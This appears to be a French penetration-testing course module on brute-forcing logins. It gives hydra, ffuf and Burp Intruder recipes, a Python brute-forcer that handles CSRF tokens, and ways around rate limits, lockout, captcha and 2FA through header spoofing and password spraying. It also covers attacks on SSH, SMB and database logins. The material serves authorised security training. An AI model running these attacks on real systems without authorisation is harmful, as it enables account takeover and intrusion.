# 16 — Login Brute Forcing

## Objectifs
Attaquer les formulaires d'authentification : hydra, ffuf, Burp Intruder, scripts custom ; gérer CSRF, tokens, rate limiting et verrouillage.

---

## 1. Reconnaissance du formulaire

```bash
# Récupérer le formulaire et ses champs
curl -s http://<TARGET>/login | grep -Eo '<form.*?</form>' -A 20
curl -s http://<TARGET>/login | grep -E 'name="[^"]+"'

# Inspecter la requête réelle (devtools / Burp)
# POST /login
# Content-Type: application/x-www-form-urlencoded
# username=admin&password=test&csrf_token=...
```

### Identifier le signal de succès/échec
- Status code (302 vs 200)
- Taille de réponse
- Chaîne "Invalid credentials" (`F=`)
- Redirection (`L=` dans hydra)

---

## 2. Hydra — http-post-form

```bash
# Syntaxe : "/path:body:condition"
# F=  → échec contient la chaîne
# S=  → succès contient la chaîne
# L=  → redirection vers l'URL

hydra -l admin -P <WORDLIST> <TARGET> http-post-form \
  "/login:username=^USER^&password=^PASS^:F=Invalid credentials"

hydra -L users.txt -P <WORDLIST> <TARGET> http-post-form \
  "/login:username=^USER^&password=^PASS^:F=Incorrect" -t 10 -f -V

# Avec cookie de session
hydra -l admin -P <WORDLIST> <TARGET> http-post-form \
  "/login:username=^USER^&password=^PASS^:F=Invalid:H=Cookie: PHPSESSID=abc123"

# HTTP Basic
hydra -L users.txt -P <WORDLIST> <TARGET> http-get /admin

# HTTPS
hydra -l admin -P <WORDLIST> -s 443 -S <TARGET> http-post-form "/login:..."
```

### Avec token CSRF
```bash
# Récupérer le token à chaque requête (hydra ne le fait pas nativement)
# → utiliser un script Python ou ffuf avec -H dynamique impossible
# Solution : macro Burp ou script requests
```

---

## 3. Burp Intruder

1. Intercepter la requête de login → *Send to Intruder*.
2. *Clear §*, sélectionner le mot de passe → *Add §*.
3. Payloads → *Simple list* → charger la wordlist.
4. Options → *Grep - Match* → "Invalid" / "Welcome".
5. *Start attack* → trier par longueur ou par colonne Grep.

### Pitchfork (username + password appariés)
```
Payload set 1: users.txt
Payload set 2: passwords.txt
Attack type: Pitchfork
```

---

## 4. ffuf sur formulaire

```bash
# POST avec -d
ffuf -u http://<TARGET>/login -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=admin&password=FUZZ" \
  -w <WORDLIST> -fc 200 -fs 1234

# Deux listes (clusterbomb)
ffuf -u http://<TARGET>/login -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=W1&password=W2" \
  -w users.txt:W1 -w <WORDLIST>:W2 -mode clusterbomb -fs 1234

# Login JSON
ffuf -u http://<TARGET>/api/login -X POST -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"FUZZ"}' -w <WORDLIST> -fs 50
```

---

## 5. Script Python (CSRF / rate limit)

```python
import requests, re, sys, time

URL = "http://<TARGET>/login"
s = requests.Session()

def get_token():
    r = s.get(URL)
    return re.search(r'name="csrf_token" value="([^"]+)"', r.text).group(1)

for pw in open(sys.argv[1], encoding="latin-1"):
    pw = pw.strip()
    data = {"username": "admin", "password": pw, "csrf_token": get_token()}
    r = s.post(URL, data=data, allow_redirects=False)
    if "Invalid" not in r.text:
        print(f"[+] FOUND: {pw}")
        break
    time.sleep(0.1)   # éviter le rate limit
```

---

## 6. Contournement des protections

| Protection | Contournement |
|---|---|
| Rate limiting | ralentir, IP rotation, `X-Forwarded-For` |
| Verrouillage de compte | spraying (1 pass / N users), pauses |
| CSRF token | script avec session, macro Burp |
| Captcha | OCR / service, ou abandon |
| 2FA | code par défaut, bypass de logique, session fixe |
| IP ban | proxychains, proxies résidentiels (autorisé) |

```bash
# Rotation d'IP via header (si l'app fait confiance)
ffuf ... -H "X-Forwarded-For: FUZZ" -w ips.txt
```

---

## 7. Wordlists & génération

```bash
# Credentials par défaut
/usr/share/seclists/Passwords/Default-Credentials/default-passwords.csv
/usr/share/seclists/Passwords/darkweb2017-top10000.txt
/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt
/usr/share/wordlists/rockyou.txt

# Contexte entreprise
cewl http://<TARGET> -d 3 -m 6 -w cewl.txt
hashcat --stdout cewl.txt -r /usr/share/hashcat/rules/best64.rule > mutated.txt

# Usernames
/usr/share/seclists/Usernames/top-usernames-shortlist.txt
/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
```

### Username enumeration
```bash
# Différence de message / temps / status
ffuf -u http://<TARGET>/login -X POST -d "username=FUZZ&password=x" \
  -w users.txt -fs 1234 -mc all
```

---

## 8. Autres protocoles

```bash
# FTP / SSH / RDP / SMB / SQL / SMTP / IMAP / POP3
hydra -L users.txt -P <WORDLIST> ftp://<TARGET>
hydra -L users.txt -P <WORDLIST> ssh://<TARGET>
hydra -L users.txt -P <WORDLIST> smb://<TARGET>
hydra -L users.txt -P <WORDLIST> mysql://<TARGET>

# NetExec spray
netexec smb <TARGET> -u users.txt -p 'Password123' --continue-on-success
netexec winrm <TARGET> -u users.txt -p 'Password123' --continue-on-success
```

---

## 9. Méthodologie

1. Comprendre le mécanisme d'auth (form, API, Basic, JWT).
2. Identifier le signal de succès.
3. Vérifier les protections (CSRF, lockout, rate limit).
4. Choisir l'outil (hydra si simple, script si token).
5. Tester d'abord les credentials par défaut (rapide).
6. Documenter le taux de requêtes et les comptes verrouillés.

---

## Checklist
- [ ] Champs et méthode identifiés
- [ ] Signal succès/échec fiable
- [ ] CSRF géré si présent
- [ ] Credentials par défaut testés
- [ ] Wordlist contextuelle
- [ ] Lockout surveillé
- [ ] Credentials valides confirmés manuellement
